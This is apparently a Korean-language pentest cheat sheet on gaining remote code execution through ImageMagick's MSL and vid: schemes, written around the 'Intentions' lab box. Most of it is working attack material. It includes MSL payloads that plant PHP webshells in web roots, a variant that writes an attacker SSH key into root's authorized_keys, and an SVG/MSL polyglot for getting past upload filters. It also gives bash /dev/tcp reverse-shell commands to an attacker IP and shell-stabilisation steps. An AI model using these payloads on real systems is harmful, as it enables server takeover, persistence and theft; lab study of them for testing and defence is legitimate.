# ImageMagick_RCE

### ImageMagick MSL/vid RCE

웹 애플리케이션이 이미지 처리에 ImageMagick을 사용할 때 발생하는 공격이다. ImageMagick은 단순한 이미지 변환 라이브러리가 아니라 MSL(Magick Scripting Language), VID, caption, info 등 다양한 내부 스킴을 지원한다. 이 스킴들을 조합하면 서버에 웹셸을 업로드해서 RCE까지 이어질 수 있다. PHP의 imagick 확장, Ruby의 rmagick, Node.js의 imagemagick 등 ImageMagick을 래핑한 라이브러리를 쓰는 앱이면 전부 영향을 받는다.

---

### 탐지

이미지를 업로드하거나 처리하는 기능이 있을 때 ImageMagick을 쓰는지 확인해야 한다. 응답 헤더, 에러 메시지, 소스코드에서 imagick, imagemagick, convert, mogrify 키워드가 보이면 의심해야 한다. path 파라미터에 외부 URL을 넣어서 요청이 나오는지 확인하면 SSRF를 통해 ImageMagick 사용 여부를 확인할 수 있다.

```bash
# path 파라미터에 외부 URL 넣기
# 칼리에서 먼저 HTTP 서버 열기
python3 -m http.server 8080

# 요청 날리기
curl -i http://<IP>/api/v2/admin/image/modify \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"path":"http://<칼리IP>:8080/test"}'
# 칼리 서버에 GET 요청 들어오면 ImageMagick이 외부 URL을 처리한다는 뜻

# 버전 확인 (내부 쉘 있을 때)
convert --version
identify --version
php -r "echo Imagick::getVersion()['versionString'];"
```

---

### MSL이란

MSL(Magick Scripting Language)은 ImageMagick에서 XML 형식으로 이미지 작업을 스크립팅하는 내장 언어다. 파일 읽기, 쓰기, 변환 등을 XML 태그로 정의할 수 있다. 핵심은 MSL이 GhostScript의 -dSAFER 샌드박스를 거치지 않고 ImageMagick 자체적으로 처리된다는 점이다. 따라서 policy.xml에서 GhostScript 관련 코더를 차단해도 MSL은 별개로 동작한다.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<image>
  <read filename="caption:<?php system($_REQUEST['cmd']); ?>" />
  <!-- caption: 스킴은 텍스트를 이미지로 만드는 ImageMagick 내장 기능 -->
  <!-- 텍스트 내용으로 PHP 웹셸 코드를 넣는 것 -->

  <write filename="info:/var/www/html/storage/app/public/shell.php" />
  <!-- info: 스킴은 파일 정보를 텍스트로 출력하는 기능 -->
  <!-- .php 확장자로 웹 루트에 쓰면 PHP 파일로 실행됨 -->
</image>
```

---

#### vid:msl:/tmp/php* 트릭 원리

이 공격의 핵심 아이디어는 두 가지다. 첫째, PHP는 multipart/form-data 요청에 파일이 포함되면 코드가 $_FILES를 처리하든 안 하든 항상 /tmp/phpXXXXXX 형태로 임시 저장한다. 둘째, ImageMagick의 vid: 스킴은 ExpandFilenames 함수를 호출해서 와일드카드(*)를 지원한다. 따라서 vid:msl:/tmp/php* 를 경로로 넘기면 ImageMagick이 /tmp/php로 시작하는 파일을 찾아서 MSL로 해석하고 실행한다. 파일명의 랜덤 부분을 알 필요가 없다.

```
요청 흐름:
1. multipart 요청으로 MSL 파일 업로드
   → PHP가 /tmp/phpXXXXXX 로 임시 저장

2. path=vid:msl:/tmp/php* 로 ImageMagick 호출
   → vid: 가 와일드카드 확장 → /tmp/phpXXXXXX 매칭
   → msl: 로 해석 → MSL XML 실행
   → caption: 으로 PHP 웹셸 텍스트 생성
   → info: 로 웹 루트에 shell.php 저장

3. 502 Bad Gateway 뜨는 게 정상 (ImageMagick이 유효한 이미지를 못 만들어서)
   → 웹셸은 이미 생성됨
```

---

### 실전 공격 — Intentions 박스 기준

```bash
# 1단계: MSL 파일 작성
cat > shell.msl <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="caption:&lt;?php system($_REQUEST['cmd']); ?&gt;" />
<write filename="info:/var/www/html/intentions/storage/app/public/shell.php" />
</image>
EOF
# &lt; &gt; 는 < > 의 HTML 엔티티. XML 파싱 오류 방지용

# 2단계: MSL 파일 업로드하면서 동시에 vid:msl:/tmp/php* 경로로 실행
# --globoff 는 curl이 [] {} * 등 글로브 문자를 URL 인코딩하지 않도록 설정
curl -i --globoff \
  'http://<IP>/api/v2/admin/image/modify?path=vid:msl:/tmp/php*&effect=abcd' \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Accept: application/json" \
  -F "file=@shell.msl;type=application/octet-stream"
# 502 Bad Gateway 응답이 와도 웹셸은 생성됨

# 3단계: 웹셸 확인
curl 'http://<IP>/storage/shell.php?cmd=id'
# 응답에 uid=33(www-data) 나오면 성공

# 4단계: 리버스셸 연결
# 칼리에서 리스너 열기
nc -lvnp 4444

# 웹셸로 리버스셸 실행
curl -G 'http://<IP>/storage/shell.php' \
  --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/<칼리IP>/4444 0>&1"'
```

---

### 웹 루트 경로 모를 때

웹 루트 경로를 모르면 MSL write 경로를 어디로 써야 할지 모른다. 아래 방법으로 경로를 먼저 파악해야 한다.

```bash
# PHP 에러 메시지에서 경로 노출될 때 활용
# ImageMagick SSRF로 phpinfo 접근
curl -i http://<IP>/api/v2/admin/image/modify \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"path":"http://127.0.0.1/phpinfo.php"}'

# 내부 쉘 있을 때
find / -name "*.php" -path "*/public/*" 2>/dev/null | head -5
cat /etc/nginx/sites-enabled/default | grep root
cat /etc/apache2/sites-enabled/*.conf | grep DocumentRoot

# /storage, /uploads, /files 같은 업로드 디렉터리 우선 시도
# Laravel 기준 기본 경로
/var/www/html/<앱명>/storage/app/public/
/var/www/html/<앱명>/public/uploads/
```

---

## MSL 웹셸 변형

상황에 따라 MSL 내용을 다르게 짜야 한다.

```bash
# 기본 웹셸
cat > shell.msl <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="caption:&lt;?php system($_REQUEST['cmd']); ?&gt;" />
<write filename="info:/var/www/html/shell.php" />
</image>
EOF

# 더 강력한 웹셸 (eval 사용)
cat > shell.msl <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="caption:&lt;?php @eval(@$_REQUEST['a']); ?&gt;" />
<write filename="info:/var/www/html/shell.php" />
</image>
EOF

# SSH 키 삽입 (root 홈에 쓸 수 있을 때)
cat > shell.msl <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="caption:ssh-rsa AAAA...칼리_공개키..." />
<write filename="info:/root/.ssh/authorized_keys" />
</image>
EOF

# 상대 경로 사용 (절대 경로 모를 때)
cat > shell.msl <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="caption:&lt;?php system($_REQUEST['cmd']); ?&gt;" />
<write filename="info:./../../uploads/shell.php" />
</image>
EOF
```

---

### policy.xml 확인

ImageMagick은 /etc/ImageMagick-6/policy.xml 또는 /etc/ImageMagick-7/policy.xml에서 허용/차단 코더를 설정한다. MSL, MVG, EPHEMERAL 등이 차단되어 있으면 이 공격이 안 된다. 내부 쉘이 있으면 먼저 확인해야 한다.

```bash
cat /etc/ImageMagick-6/policy.xml
cat /etc/ImageMagick-7/policy.xml

# MSL이 차단된 경우 예시
# <policy domain="coder" rights="none" pattern="MSL" />
# 이게 있으면 MSL 공격 불가

# 차단 안 된 경우
# 해당 policy 없거나 rights="read|write" 로 되어 있으면 공격 가능

# 버전별 기본 policy 위치
find / -name "policy.xml" 2>/dev/null
```

---

### SVG/MSL 폴리글랏 방식 (파일 업로드 필터 우회)

파일 업로드에서 .svg만 허용할 때 SVG와 MSL 둘 다 유효한 폴리글랏 파일을 만들어서 우회할 수 있다. SVG 파싱 중에 msl: 스킴이 트리거된다.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<image authenticate='ff" `id`;"'>
  <!-- SVG로도 파싱되고 MSL로도 파싱되는 폴리글랏 -->
  <read filename="caption:&lt;?php system($_REQUEST['cmd']); ?&gt;" />
  <write filename="info:/var/www/html/shell.php" />
  <svg width="700" height="700"
       xmlns="http://www.w3.org/2000/svg"
       xmlns:xlink="http://www.w3.org/1999/xlink">
    <image xlink:href="msl:poc.svg" height="100" width="100"/>
    <!-- 자기 자신을 msl: 스킴으로 참조해서 MSL 실행 트리거 -->
  </svg>
</image>
```

---

### 리버스셸 안정화

```bash
# 웹셸 얻은 후 리버스셸로 업그레이드
# 칼리에서 리스너
nc -lvnp 4444

# 웹셸로 실행
curl -G 'http://<IP>/storage/shell.php' \
  --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/<칼리IP>/4444 0>&1"'

# 받은 셸 안정화
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
# Enter 두 번

# 또는 script로 안정화
script /dev/null -c bash
```